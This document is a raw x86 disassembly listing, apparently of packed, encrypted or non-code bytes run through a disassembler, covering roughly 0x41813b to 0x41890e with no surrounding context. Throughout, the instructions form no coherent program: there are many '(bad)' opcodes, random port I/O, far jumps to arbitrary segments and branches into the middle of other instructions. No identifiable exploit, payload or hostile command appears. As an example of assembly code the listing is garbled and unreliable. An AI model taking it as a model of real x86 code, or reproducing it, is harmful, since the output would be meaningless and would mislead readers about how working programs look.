  41813b:	cld    
  41813c:	jne    0x4180fa
  41813e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41813f:	push   edx
  418140:	(bad)  [esi+0x23]
  418143:	fwait
  418144:	mov    eax,ds:0xbe9805a6
  418149:	fcmove st,st(7)
  41814b:	push   ebp
  41814c:	in     eax,dx
  41814d:	(bad)  
  41814e:	sub    al,0xa1
  418150:	pusha  
  418151:	sar    BYTE PTR [edi+0x10641454],1
  418157:	adc    al,bh
  418159:	push   es
  41815a:	push   ebp
  41815b:	jnp    0x4181b7
  41815d:	addr16 adc ch,ah
  418160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418161:	enter  0x3f74,0xc2
  418165:	and    edi,DWORD PTR [ecx-0x19]
  418168:	addr16 cmp ah,0xc5
  41816c:	dec    ebp
  41816d:	sbb    BYTE PTR [ebx-0x79],ch
  418170:	push   ecx
  418171:	ror    BYTE PTR [edi+0x889e00],cl
  418177:	jmp    0x555e:0xa79c39f0
  41817e:	jmp    0xd0d4:0x7fd2fbad
  418185:	out    0x2d,eax
  418187:	fbld   TBYTE PTR [esi]
  418189:	add    esi,DWORD PTR [eax-0x76]
  41818c:	inc    esp
  41818d:	push   eax
  41818e:	sbb    BYTE PTR [edi+0x67fe539],ah
  418194:	lods   eax,DWORD PTR ds:[esi]
  418195:	sbb    BYTE PTR [edx+0x17],ah
  418198:	inc    ebp
  418199:	xchg   esp,eax
  41819a:	nop
  41819b:	(bad)  
  41819c:	dec    edx
  41819d:	cmp    eax,0xfb459d1a
  4181a2:	or     ecx,DWORD PTR [eax+0x6c]
  4181a5:	pop    eax
  4181a6:	scas   al,BYTE PTR es:[edi]
  4181a7:	fmul   DWORD PTR es:[esi]
  4181aa:	jne    0x4181cc
  4181ac:	int3   
  4181ad:	add    BYTE PTR ds:0xa906f56b,dh
  4181b3:	shl    DWORD PTR [ecx-0x46],1
  4181b6:	push   eax
  4181b7:	push   ss
  4181b8:	les    esp,FWORD PTR [ebx+0x3e]
  4181bb:	mov    ds:0x7f022793,al
  4181c0:	inc    ebp
  4181c1:	adc    eax,0xac95d02e
  4181c6:	(bad)  
  4181c7:	cmc    
  4181c8:	xlat   BYTE PTR ds:[ebx]
  4181c9:	sbb    al,0xea
  4181cb:	sub    eax,0x102e1c3e
  4181d0:	push   0x2d
  4181d2:	pop    ebx
  4181d3:	adc    dl,BYTE PTR [edi-0x4b864beb]
  4181d9:	shl    BYTE PTR [esi-0x3d],1
  4181dc:	(bad)  
  4181dd:	adc    bl,BYTE PTR [edi+0x1d]
  4181e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181e1:	mov    ecx,0x53a4e12
  4181e6:	je     0x418235
  4181e8:	xor    DWORD PTR [edx-0x73],edi
  4181eb:	mov    eax,ds:0xe2b4a06
  4181f0:	dec    edi
  4181f1:	xchg   DWORD PTR [esi+eax*1],edi
  4181f4:	push   ebp
  4181f5:	gs xchg ch,dh
  4181f8:	fdivrp st(5),st
  4181fa:	fmul   QWORD PTR [eax-0x7a21f33d]
  418200:	mov    ds:0x78411920,al
  418205:	inc    esi
  418206:	rcl    BYTE PTR [esp+edi*1+0x7f2daedf],cl
  41820d:	inc    esp
  41820e:	test   BYTE PTR [edi-0x4d4628de],bl
  418214:	repnz jecxz 0x418277
  418217:	lock in al,dx
  418219:	jb     0x4181c9
  41821b:	pop    ss
  41821c:	shr    BYTE PTR [esi+0x2f96ecdc],cl
  418222:	or     ah,BYTE PTR [eax-0x7b]
  418225:	fidivr DWORD PTR [ebx-0x44]
  418229:	(bad)  
  41822a:	adc    esp,DWORD PTR [eax+0x4a]
  41822d:	nop
  41822e:	loopne 0x418245
  418230:	inc    ebp
  418231:	and    ah,BYTE PTR [edx-0x40]
  418234:	iret   
  418235:	mov    esp,0x2ed51628
  41823a:	shl    DWORD PTR ds:0x9946cfe8,1
  418240:	nop
  418241:	out    0x7e,eax
  418243:	pop    ecx
  418244:	stc    
  418245:	aas    
  418246:	imul   BYTE PTR [edx+0x1]
  418249:	add    edx,DWORD PTR [edi-0x5b878139]
  41824f:	test   DWORD PTR es:[ebp+0x26],0x34b9345
  418257:	jbe    0x4181dc
  418259:	repnz xor al,0xc8
  41825c:	sub    BYTE PTR [ecx+ebp*2-0x5737f830],dl
  418263:	repnz jecxz 0x418274
  418266:	imul   ecx,DWORD PTR [edi+0x3b],0xffffff80
  41826a:	(bad)  
  41826b:	addr16 xchg edi,eax
  41826d:	pop    es
  41826e:	jmp    0x418278
  418270:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418271:	lahf   
  418272:	fcom   QWORD PTR [ebp+ecx*4+0x3722f076]
  418279:	jno    0x4182ca
  41827b:	daa    
  41827c:	jmp    0x418241
  41827e:	xor    eax,0x9ea45f52
  418283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418284:	mov    cl,0x9c
  418286:	cmp    al,0xb2
  418288:	(bad)
  41828c:	ja     0x4182cc
  41828e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41828f:	out    0xb2,eax
  418291:	push   edi
  418292:	mov    esp,0x13dfa541
  418297:	rol    DWORD PTR [ecx-0xa],1
  41829a:	outs   dx,DWORD PTR ds:[esi]
  41829b:	mov    ds:0x61fb5385,eax
  4182a0:	xchg   esp,eax
  4182a1:	call   ebp
  4182a3:	sti    
  4182a4:	xor    bl,ah
  4182a6:	inc    edi
  4182a7:	cmp    dh,ch
  4182a9:	aaa    
  4182aa:	xor    eax,0xd55a7512
  4182af:	xchg   ebp,eax
  4182b0:	test   al,0x58
  4182b2:	jge    0x41824c
  4182b4:	sub    al,0x7a
  4182b6:	pusha  
  4182b7:	dec    edx
  4182b8:	push   esi
  4182b9:	std    
  4182ba:	sbb    al,0x6b
  4182bc:	adc    ebp,DWORD PTR [edi-0x60f0fc7]
  4182c2:	inc    edx
  4182c3:	in     al,0xe4
  4182c5:	pop    edx
  4182c6:	push   esi
  4182c7:	sbb    edx,esp
  4182c9:	imul   ecx,DWORD PTR [edi],0xfbca7805
  4182cf:	adc    al,0x0
  4182d1:	test   edi,0x71030fc9
  4182d7:	inc    esp
  4182d8:	mov    ah,0x7a
  4182da:	mov    esi,0xb2604ab0
  4182df:	pusha  
  4182e0:	jo     0x41835a
  4182e2:	sbb    al,0xd0
  4182e4:	mov    cl,0x41
  4182e6:	pop    ebx
  4182e7:	shr    BYTE PTR [ecx],1
  4182e9:	int3   
  4182ea:	lahf   
  4182eb:	xchg   DWORD PTR [edi],eax
  4182ed:	jns    0x41830e
  4182ef:	ins    DWORD PTR es:[edi],dx
  4182f0:	enter  0x5060,0x59
  4182f4:	adc    eax,0x7ff1ce8
  4182f9:	int    0x68
  4182fb:	stos   DWORD PTR es:[edi],eax
  4182fc:	mov    edi,0xe721f1d2
  418301:	mov    ds:0xd762cdc1,eax
  418306:	outs   dx,BYTE PTR ds:[esi]
  418307:	js     0x41832d
  418309:	nop
  41830a:	mov    esp,0x19854156
  41830f:	adc    ch,BYTE PTR [ebp-0x19]
  418312:	scas   eax,DWORD PTR es:[edi]
  418313:	add    eax,0x37641b6f
  418318:	test   BYTE PTR [esi],bh
  41831a:	push   edi
  41831b:	ret    0xcbe2
  41831e:	rcr    BYTE PTR [eax-0x997e3c3],0x0
  418325:	xchg   edx,eax
  418326:	es or  BYTE PTR ds:[ebx+0x1ff7f56d],dl
  41832e:	loope  0x4183ae
  418330:	mov    al,0xaa
  418332:	xchg   esi,eax
  418333:	(bad)  
  418334:	mov    bl,0x49
  418336:	adc    eax,DWORD PTR [ecx+0x69]
  418339:	stc    
  41833a:	mov    ?,ebp
  41833c:	mov    edx,0x49716040
  418341:	adc    DWORD PTR [edi-0x7d],0xffffffa5
  418345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418346:	sub    dh,bh
  418348:	ins    BYTE PTR es:[edi],dx
  418349:	aaa    
  41834a:	outs   dx,DWORD PTR ds:[esi]
  41834b:	xor    ch,cl
  41834d:	ins    BYTE PTR es:[edi],dx
  41834e:	cmp    eax,0xb0ef2ae7
  418353:	xchg   ecx,eax
  418354:	arpl   WORD PTR [esp+ebx*8],di
  418357:	pop    ebx
  418358:	fdivr  DWORD PTR [ecx-0xfd01ac4]
  41835e:	js     0x418336
  418360:	fldenv [eax]
  418362:	inc    ebx
  418363:	mov    al,BYTE PTR [ecx-0x1a]
  418366:	and    al,BYTE PTR [edx+0x2d]
  418369:	ins    DWORD PTR es:[edi],dx
  41836a:	or     al,0xbf
  41836c:	retf   
  41836d:	daa    
  41836e:	xor    DWORD PTR [ebx],esp
  418370:	je     0x4183d0
  418372:	popf   
  418373:	(bad)  
  418374:	jmp    0x41838f
  418376:	ins    DWORD PTR es:[edi],dx
  418377:	enter  0x7811,0x1f
  41837b:	fisubr WORD PTR [esi-0x32b11dcf]
  418381:	push   eax
  418382:	ins    DWORD PTR es:[edi],dx
  418383:	adc    al,0x2e
  418385:	call   0xb3bc7a1e
  41838a:	push   ecx
  41838b:	ins    DWORD PTR es:[edi],dx
  41838c:	fdivr  st,st(0)
  41838e:	push   eax
  41838f:	sub    eax,ebx
  418391:	jbe    0x418397
  418393:	mov    ebx,0xc6e2a695
  418398:	or     DWORD PTR [ecx-0x4a9867d9],ecx
  41839e:	xor    bh,BYTE PTR [ebx-0x4a]
  4183a1:	loopne 0x418354
  4183a3:	jle    0x4183dd
  4183a5:	lods   al,BYTE PTR ds:[esi]
  4183a6:	je     0x418404
  4183a8:	pop    esp
  4183a9:	adc    ebp,DWORD PTR [esp+esi*4+0x76]
  4183ad:	fdivr  DWORD PTR [edi-0x78b4e3b7]
  4183b3:	cmp    al,BYTE PTR [eax-0x3f]
  4183b6:	in     eax,dx
  4183b7:	rol    BYTE PTR [ebp+0x71071c19],1
  4183bd:	cld    
  4183be:	mov    ebx,0x46410f89
  4183c3:	in     eax,dx
  4183c4:	sbb    al,0x3d
  4183c6:	xor    eax,0xe49d8b19
  4183cb:	pop    eax
  4183cc:	call   0x64bd:0x9c6350a
  4183d3:	fild   QWORD PTR [edx]
  4183d5:	rcl    BYTE PTR [ecx-0x22814f37],1
  4183db:	mov    eax,0x1a1e6fb3
  4183e0:	add    BYTE PTR [eax],al
  4183e2:	add    BYTE PTR [eax],al
  4183e4:	add    BYTE PTR [eax],al
  4183e6:	popa   
  4183e7:	push   0xffffffe9
  4183e9:	pop    ss
  4183ea:	jmp    0x418383
  4183ec:	(bad)  
  4183ed:	jle    0x4183f5
  4183ef:	js     0x41839e
  4183f1:	aam    0x6
  4183f3:	cmp    BYTE PTR [esi+0x17e6d13],0x0
  4183fa:	and    al,BYTE PTR [edi]
  4183fc:	add    BYTE PTR [eax],al
  4183fe:	mov    dh,0x6f
  418400:	mov    esi,0x4d8b3ea5
  418405:	test   eax,0x5915e086
  41840a:	gs mov ecx,0xf51807ed
  418410:	jecxz  0x418431
  418412:	ficomp WORD PTR [ebx-0x7d]
  418415:	and    edi,eax
  418417:	test   BYTE PTR [edx-0x4314feec],bl
  41841d:	xor    BYTE PTR [ecx-0x26609fc3],bh
  418423:	or     bh,BYTE PTR [eax-0x2dbcc2ac]
  418429:	jae    0x418432
  41842b:	cmp    esp,DWORD PTR [eax]
  41842d:	dec    esi
  41842e:	sub    ch,dh
  418430:	out    0xce,al
  418432:	sbb    bl,BYTE PTR [edi]
  418434:	push   cs
  418435:	jmp    0x91b2fa41
  41843a:	es call 0xd234:0xacf683a9
  418442:	push   ds
  418443:	or     dl,BYTE PTR [esi-0x6e]
  418446:	das    
  418447:	xor    ebx,DWORD PTR [edx-0x7]
  41844a:	dec    ebx
  41844b:	enter  0xc391,0xbd
  41844f:	call   0x2d64:0xee766b22
  418456:	jmp    0x418470
  418458:	outs   dx,BYTE PTR ds:[esi]
  418459:	out    dx,al
  41845a:	dec    esp
  41845b:	lock mov esp,0xdd338a8e
  418461:	jae    0x4183ee
  418463:	pop    edx
  418464:	dec    edi
  418465:	dec    edi
  418466:	sub    al,0xe8
  418469:	pop    ss
  41846a:	out    0xe2,eax
  41846c:	in     eax,dx
  41846d:	mov    dl,0xf7
  41846f:	mov    ch,0xf4
  418471:	mov    esi,ebx
  418473:	sbb    dl,bl
  418475:	cmp    ecx,DWORD PTR [ebp+0x34]
  418478:	jmp    0x4184b3
  41847a:	out    0xf1,eax
  41847c:	test   dl,ah
  41847e:	sar    BYTE PTR [edi+0x72d9a79f],1
  418484:	mov    cl,0x28
  418486:	call   0xd17a61e
  41848b:	pushf  
  41848c:	adc    ch,BYTE PTR [eax+ebx*4+0x7f]
  418490:	or     DWORD PTR [ebp-0x29],edx
  418493:	dec    ebp
  418494:	scas   al,BYTE PTR es:[edi]
  418495:	lods   al,BYTE PTR ds:[esi]
  418496:	inc    esp
  418497:	push   edx
  418498:	or     eax,0xd6597a23
  41849d:	cli    
  41849e:	aaa    
  41849f:	pop    ss
  4184a0:	jae    0x4184d3
  4184a2:	lahf   
  4184a3:	cmp    esi,DWORD PTR [ecx-0x26]
  4184a6:	jmp    DWORD PTR [ecx+0x7aeb6d47]
  4184ac:	mov    dh,BYTE PTR [ecx+0x11ebe39c]
  4184b2:	call   0xc8a91ae4
  4184b7:	call   0x2222d1ef
  4184bc:	ror    DWORD PTR [ecx-0x6b],cl
  4184bf:	mov    ?,esi
  4184c1:	loop   0x418536
  4184c3:	fwait
  4184c4:	push   esi
  4184c5:	pop    edx
  4184c6:	mov    eax,0x4eefefd8
  4184cb:	dec    edi
  4184cc:	ins    DWORD PTR es:[edi],dx
  4184cd:	loope  0x41852c
  4184cf:	sub    cl,bh
  4184d1:	aaa    
  4184d2:	jb     0x418516
  4184d4:	inc    edi
  4184d5:	test   al,ah
  4184d7:	mov    esp,eax
  4184d9:	pop    esp
  4184da:	ins    DWORD PTR es:[edi],dx
  4184db:	sub    ecx,DWORD PTR [ecx-0x1416e066]
  4184e1:	mov    ah,0xb1
  4184e3:	cmp    eax,0xb9206d8
  4184e8:	or     ebx,ebx
  4184ea:	vandpd xmm2,xmm3,XMMWORD PTR [edx]
  4184ee:	push   esi
  4184ef:	push   ebp
  4184f0:	aad    0xbd
  4184f2:	cmp    BYTE PTR [ebx],ch
  4184f4:	and    DWORD PTR [edi-0x534c25fd],0xffffffb8
  4184fb:	out    dx,al
  4184fc:	lds    ecx,FWORD PTR [esi-0x6c5f9dd8]
  418502:	stos   DWORD PTR es:[edi],eax
  418503:	sbb    DWORD PTR [esi+0x5c],ebp
  418506:	mov    cl,0x76
  418508:	jmp    0x71c4:0x47ee2d50
  41850f:	xchg   esp,eax
  418510:	fnstenv [ebp+eiz*8+0x5a]
  418514:	out    0xfb,eax
  418516:	sbb    ecx,ebp
  418518:	test   DWORD PTR [edx+0x44],0xb410a67a
  41851f:	inc    esp
  418520:	sub    DWORD PTR [edi+0xd05da0b],ebp
  418526:	push   ebx
  418527:	pop    edi
  418528:	jbe    0x4184b2
  41852a:	loope  0x418545
  41852c:	dec    ecx
  41852d:	and    edx,esi
  41852f:	mov    ch,0x98
  418531:	jbe    0x418567
  418533:	enter  0x1a78,0x64
  418537:	or     BYTE PTR ds:[ebp+0xc6c8477],ch
  41853e:	(bad)  
  41853f:	or     al,0xaa
  418541:	add    eax,0x78d2076
  418546:	jns    0x4184e8
  418548:	and    ebx,edx
  41854a:	call   0xacde1c26
  41854f:	pop    ds
  418550:	repz fdivr st(1),st
  418553:	rcr    BYTE PTR [edi],cl
  418555:	inc    ebx
  418556:	inc    esi
  418557:	outs   dx,DWORD PTR ds:[esi]
  418558:	mov    ch,0x41
  41855a:	(bad)  
  41855b:	adc    al,0x9c
  41855d:	rcr    dh,cl
  41855f:	ins    BYTE PTR es:[edi],dx
  418560:	mov    BYTE PTR [esi-0x1da4249],al
  418566:	sahf   
  418567:	shl    DWORD PTR [eax-0x18970110],1
  41856d:	imul   ebp,DWORD PTR [ebx],0xffffffd7
  418570:	xor    esp,DWORD PTR [edx-0x743be01a]
  418576:	outs   dx,DWORD PTR ds:[esi]
  418577:	cmp    al,0xb1
  418579:	nop
  41857a:	mov    bl,0x66
  41857c:	dec    esi
  41857d:	dec    edi
  41857e:	inc    edi
  418580:	fs jo  0x41850a
  418583:	pop    eax
  418584:	jmp    0xccd0145a
  418589:	inc    ebx
  41858a:	cs xchg cl,ah
  41858d:	pop    edi
  41858e:	icebp  
  41858f:	test   DWORD PTR [edi],0xaa78d845
  418595:	push   esi
  418596:	mov    esp,0x1626ad39
  41859b:	repnz push ecx
  41859d:	outs   dx,DWORD PTR ds:[esi]
  41859e:	leave  
  41859f:	(bad)  
  4185a0:	out    0x39,eax
  4185a2:	mov    ds:0x7867059a,al
  4185a7:	mov    dl,0xfc
  4185a9:	pop    edi
  4185aa:	or     ah,bl
  4185ac:	xor    al,0x8f
  4185ae:	and    al,0x50
  4185b0:	inc    esp
  4185b1:	push   ds
  4185b2:	add    eax,0xf4995506
  4185b7:	mov    dl,0xbc
  4185b9:	js     0x418572
  4185bb:	sbb    DWORD PTR [edx+0x2026a76f],esi
  4185c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185c2:	sbb    eax,0x83650f63
  4185c7:	sub    al,0xaf
  4185c9:	retf   
  4185ca:	js     0x41863b
  4185cc:	test   DWORD PTR [ecx],0xc69d1be
  4185d2:	mov    ebx,0x1a843a34
  4185d7:	cmp    BYTE PTR [ecx+edx*8-0x6d],bh
  4185db:	push   edx
  4185dc:	stos   DWORD PTR es:[edi],eax
  4185dd:	push   esp
  4185de:	mov    ds:0x9a975c88,eax
  4185e3:	repnz jecxz 0x418606
  4185e6:	cmp    al,0x25
  4185e8:	stos   BYTE PTR es:[edi],al
  4185e9:	mov    bl,0x8
  4185eb:	mov    eax,ds:0x7ea31b6
  4185f1:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4185f3:	scas   al,BYTE PTR es:[edi]
  4185f4:	push   0x39575cb2
  4185f9:	out    dx,eax
  4185fa:	mov    BYTE PTR [ebp-0x5c],bl
  4185fd:	mov    esi,0xa8f0b150
  418602:	xlat   BYTE PTR ds:[ebx]
  418603:	aas    
  418604:	loop   0x418653
  418606:	lahf   
  418607:	adc    ch,BYTE PTR [eax+0x15]
  41860a:	push   0x4f
  41860c:	loope  0x4185fb
  41860e:	pop    ss
  41860f:	(bad)  
  418610:	scas   eax,DWORD PTR es:[edi]
  418611:	test   BYTE PTR [ecx],dh
  418613:	push   esi
  418614:	inc    edx
  418615:	aas    
  418616:	mov    bl,0x29
  418618:	sbb    eax,0xbbd9594f
  41861d:	and    ah,BYTE PTR [ebx-0x7e]
  418620:	jg     0x4185d6
  418622:	fwait
  418623:	cmp    BYTE PTR [ebx+ecx*4+0x1f],bh
  418627:	ret    
  418628:	arpl   WORD PTR [esi+0x2],cx
  41862b:	add    bl,BYTE PTR [edi-0x6767b9d8]
  418631:	addr16 or eax,0x3e086183
  418637:	(bad)  [ebp-0x38]
  41863a:	daa    
  41863b:	outs   dx,DWORD PTR ds:[esi]
  41863c:	xchg   BYTE PTR [edx+0x3c0120fe],cl
  418642:	stos   BYTE PTR es:[edi],al
  418643:	jbe    0x418600
  418645:	mov    dl,0x45
  418647:	or     edi,DWORD PTR [ebx-0x1fbdcd0d]
  41864d:	int3   
  41864e:	mov    dl,0xb6
  418650:	fisttp WORD PTR ds:0xe5cf8b3c
  418656:	jne    0x418641
  418658:	fwait
  418659:	add    esi,DWORD PTR [esi-0x26634b8c]
  41865f:	jge    0x4186bf
  418661:	ret    
  418662:	leave  
  418663:	leave  
  418664:	nop
  418665:	sbb    eax,0xef7cc525
  41866a:	mov    dl,0xea
  41866c:	call   0x17c7dcfb
  418671:	and    bh,BYTE PTR ds:0xf1156c71
  418677:	stos   BYTE PTR es:[edi],al
  418678:	hlt    
  418679:	mov    ebx,0xb2a8d0ed
  41867e:	ins    BYTE PTR es:[edi],dx
  41867f:	dec    esp
  418680:	adc    dh,BYTE PTR [edi-0x3a]
  418683:	mov    dh,0xef
  418685:	out    dx,al
  418686:	mov    bh,0xf9
  418688:	scas   al,BYTE PTR es:[edi]
  418689:	mov    BYTE PTR [ebx+0x670be517],cl
  41868f:	leave  
  418690:	test   eax,0x3ca00f96
  418695:	ret    
  418696:	les    edx,FWORD PTR [esi+edi*4-0x1b665e27]
  41869d:	or     ch,BYTE PTR ds:0x923989cc
  4186a3:	xor    eax,0x44e8cfcd
  4186a8:	mov    esp,0x9f3ce3e4
  4186ad:	pop    ecx
  4186ae:	pop    ss
  4186af:	sbb    eax,esp
  4186b1:	sub    edi,DWORD PTR [edi+0x3c6cf13e]
  4186b7:	imul   eax,eax,0xffffffca
  4186ba:	mov    ch,cl
  4186bc:	fdiv   st,st(0)
  4186be:	addr16 mov cl,0x42
  4186c1:	gs pop esi
  4186c3:	out    0x2f,al
  4186c5:	push   es
  4186c6:	inc    ebp
  4186c7:	loopne 0x41870e
  4186c9:	mov    BYTE PTR [ebx],cl
  4186cb:	addr16 sub eax,0x45afb68e
  4186d1:	lock push ebp
  4186d3:	jp     0x4186cf
  4186d5:	push   ebx
  4186d6:	jb     0x418673
  4186d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186d9:	idiv   DWORD PTR [edx-0x6c5ec6ad]
  4186df:	sbb    al,0xba
  4186e1:	jl     0x4186d7
  4186e3:	lods   eax,DWORD PTR ds:[esi]
  4186e4:	mov    ?,WORD PTR [ebx]
  4186e6:	stos   BYTE PTR es:[edi],al
  4186e7:	inc    eax
  4186e8:	es ins BYTE PTR es:[edi],dx
  4186ea:	ror    BYTE PTR [ebp-0x4e],0x24
  4186ee:	sbb    eax,0x91bc5df1
  4186f3:	jbe    0x418753
  4186f5:	ret    0x600f
  4186f8:	xchg   esi,eax
  4186f9:	(bad)  
  4186fb:	xchg   BYTE PTR [esi-0x6a],cl
  4186fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186ff:	pop    ebp
  418700:	adc    ebx,0xffffffbc
  418703:	xchg   BYTE PTR [ebx+0x4e586dd4],cl
  418709:	addr16 mov dh,0x9a
  41870c:	dec    ecx
  41870d:	rcr    edi,1
  41870f:	pop    edi
  418710:	gs cmp edx,0xeb58f9fe
  418717:	aam    0xac
  418719:	cmp    eax,0x7f9eb6c4
  41871e:	inc    ebp
  41871f:	pop    ss
  418720:	mov    cl,0xfb
  418722:	outs   dx,BYTE PTR ds:[esi]
  418723:	rcr    eax,1
  418725:	mov    ecx,0xeaa1c33c
  41872a:	jle    0x418766
  41872c:	cmp    DWORD PTR [eax+0x36eb48af],esi
  418732:	push   edx
  418733:	add    ecx,DWORD PTR [edx]
  418735:	push   edx
  418736:	mov    ebx,0xb07975e7
  41873b:	or     ecx,esp
  41873d:	adc    esi,DWORD PTR ss:[ecx+0x5f]
  418741:	dec    eax
  418742:	push   cs
  418743:	inc    esi
  418744:	and    DWORD PTR [ecx],edi
  418746:	and    BYTE PTR [esi],ch
  418748:	push   eax
  418749:	sub    al,0x2c
  41874b:	cmp    bl,BYTE PTR [edx+0x7072f79d]
  418751:	aas    
  418752:	sub    ecx,DWORD PTR [esp+eiz*2-0xd]
  418756:	es ss mov bl,0xa6
  41875a:	sub    edi,esi
  41875c:	dec    ebp
  41875d:	inc    edx
  41875e:	sbb    bl,BYTE PTR [eax+0x7b470c47]
  418764:	sub    al,0xbb
  418766:	or     DWORD PTR [edx],0xe18485c9
  41876c:	cs stc 
  41876e:	arpl   WORD PTR [ecx+0x72],sp
  418771:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418772:	jle    0x418737
  418774:	in     al,dx
  418775:	or     eax,0xaac6f818
  41877a:	sbb    eax,0xa9c45d5b
  41877f:	sbb    bl,BYTE PTR [esi+esi*1]
  418782:	add    eax,ebx
  418784:	les    ebp,FWORD PTR [ebp+0x43eda47d]
  41878a:	shl    al,0x36
  41878d:	ins    DWORD PTR es:[edi],dx
  41878e:	js     0x41874c
  418790:	mov    WORD PTR [ebp+0x65c5757f],es
  418796:	jno    0x418770
  418798:	pop    es
  418799:	and    edx,DWORD PTR [esi]
  41879b:	jbe    0x418786
  41879d:	sbb    al,0xaa
  41879f:	push   edi
  4187a0:	xchg   ebx,eax
  4187a1:	or     eax,0x877288c
  4187a6:	pop    esp
  4187a7:	arpl   cx,bp
  4187a9:	fcmovnb st,st(1)
  4187ab:	lods   al,BYTE PTR ds:[esi]
  4187ac:	pop    ds
  4187ad:	mov    bl,0xb0
  4187af:	aaa    
  4187b0:	xchg   DWORD PTR [edx+0x5679e5bf],ebp
  4187b6:	scas   eax,DWORD PTR es:[edi]
  4187b7:	sbb    edi,edi
  4187b9:	clc    
  4187ba:	fnstenv [si-0x5a]
  4187be:	and    DWORD PTR [eax],edi
  4187c0:	xor    eax,0xcfe2b15d
  4187c5:	scas   eax,DWORD PTR es:[edi]
  4187c6:	pop    eax
  4187c7:	sbb    eax,edi
  4187c9:	adc    al,0xde
  4187cb:	imul   eax,DWORD PTR ds:0x9dcc5437,0x66a220ba
  4187d5:	jae    0x4187f8
  4187d7:	or     DWORD PTR [ecx+0x49e518e6],esi
  4187dd:	push   ebx
  4187de:	cdq    
  4187df:	loop   0x41882d
  4187e1:	outs   dx,BYTE PTR ds:[esi]
  4187e2:	retf   0x437b
  4187e5:	dec    edi
  4187e6:	xchg   ebp,eax
  4187e7:	sbb    edi,esi
  4187e9:	addr16 loop 0x418778
  4187ec:	mov    eax,0xb85a3bc7
  4187f1:	mov    eax,ds:0x8d458841
  4187f6:	sub    edx,eax
  4187f8:	mov    ds:0xbd767404,al
  4187fd:	adc    ch,al
  4187ff:	gs jnp 0x4187ac
  418802:	mov    bh,0x49
  418804:	or     ebx,DWORD PTR [ebp-0x6e]
  418807:	out    0x8a,eax
  418809:	ret    0x579a
  41880c:	pop    edi
  41880d:	or     al,0xd5
  41880f:	jnp    0x41880b
  418811:	add    ebx,eax
  418813:	xchg   BYTE PTR [eax-0x2f],bh
  418816:	jbe    0x418887
  418818:	ds push ebx
  41881a:	cmp    al,0x3
  41881c:	push   es
  41881d:	pop    ebp
  41881e:	lock and dh,0xcc
  418822:	hlt    
  418823:	loopne 0x418807
  418825:	cmc    
  418826:	outs   dx,BYTE PTR ds:[esi]
  418827:	xchg   ebx,eax
  418828:	inc    esi
  418829:	pop    es
  41882a:	(bad)  
  41882b:	xlat   BYTE PTR ds:[ebx]
  41882c:	popa   
  41882d:	fs sbb edi,esp
  418830:	xchg   esp,eax
  418831:	test   DWORD PTR [esi+ebp*2-0x4f2ae5],eax
  418838:	test   BYTE PTR [ebp+0x1ca4b364],bh
  41883e:	mov    dh,0xad
  418840:	ficom  WORD PTR [edi-0x20f41ca1]
  418846:	repnz fld TBYTE PTR [ebx-0x1e]
  41884a:	dec    ebp
  41884b:	retf   0x4a0c
  41884e:	xor    ah,BYTE PTR [edi]
  418850:	mov    esp,0xa18041d2
  418855:	in     al,dx
  418856:	fsub   DWORD PTR [ebx-0x3c]
  418859:	fidivr WORD PTR [edi-0x22]
  41885c:	xchg   ebp,eax
  41885d:	jae    0x418864
  41885f:	int    0xfb
  418861:	inc    dh
  418863:	call   0xdb63:0x547c0f4f
  41886a:	jae    0x4188cc
  41886c:	inc    ecx
  41886d:	bound  ecx,QWORD PTR [edx+edi*2]
  418870:	cmp    ah,BYTE PTR [ebx+edx*4-0x72f53db9]
  418877:	fsubr  st,st(6)
  418879:	ins    BYTE PTR es:[edi],dx
  41887a:	jmp    0xfa3d4b0d
  41887f:	jb     0x4188b5
  418881:	xchg   DWORD PTR [ecx-0x5b],eax
  418884:	and    al,BYTE PTR [ebp+0xd41f3e5]
  41888a:	popa   
  41888b:	xchg   BYTE PTR [edx+0x14510da6],cl
  418891:	in     al,0xd6
  418893:	fs clc 
  418895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418897:	push   0x2bdc58ee
  41889c:	adc    dl,BYTE PTR [ecx+0x2f]
  41889f:	lahf   
  4188a0:	mov    al,ds:0x98d818c3
  4188a5:	jge    0x41889e
  4188a7:	push   ebp
  4188a8:	ret    0x176b
  4188ab:	addr16 xor eax,0xe8230ac3
  4188b1:	pusha  
  4188b2:	push   eax
  4188b3:	push   eax
  4188b4:	push   eax
  4188b5:	pop    es
  4188b6:	les    ebp,FWORD PTR [edi+0x48]
  4188b9:	ja     0x418903
  4188bb:	icebp  
  4188bc:	hlt    
  4188bd:	cmp    eax,0x9c896e0c
  4188c2:	or     eax,0x2d4c9a17
  4188c7:	mov    eax,0x73935dc0
  4188cc:	sbb    al,0x95
  4188ce:	daa    
  4188cf:	jmp    0x418880
  4188d1:	stos   DWORD PTR es:[edi],eax
  4188d2:	loop   0x418949
  4188d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188d5:	(bad)  
  4188d6:	jmp    0x5b97:0xaced2a5a
  4188dd:	pushf  
  4188de:	push   edi
  4188df:	cmp    DWORD PTR [ecx+0x54],esi
  4188e2:	fs adc ecx,ecx
  4188e5:	add    DWORD PTR [edx+0x2017cec9],0xa5a1b6fa
  4188ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188f0:	jge    0x41892d
  4188f2:	in     al,0x43
  4188f4:	or     BYTE PTR [esi],0x34
  4188f7:	jae    0x41895e
  4188f9:	and    bl,bh
  4188fb:	adc    bh,BYTE PTR [ebp-0x50]
  4188fe:	aam    0x4a
  418900:	dec    edx
  418901:	repnz sub BYTE PTR [edx-0xb],dh
  418905:	push   0x4
  418907:	jnp    0x418949
  418909:	in     eax,0x2b
  41890b:	jo     0x4188bf
  41890d:	dec    edx
  41890e:	xchg   ebx,eax
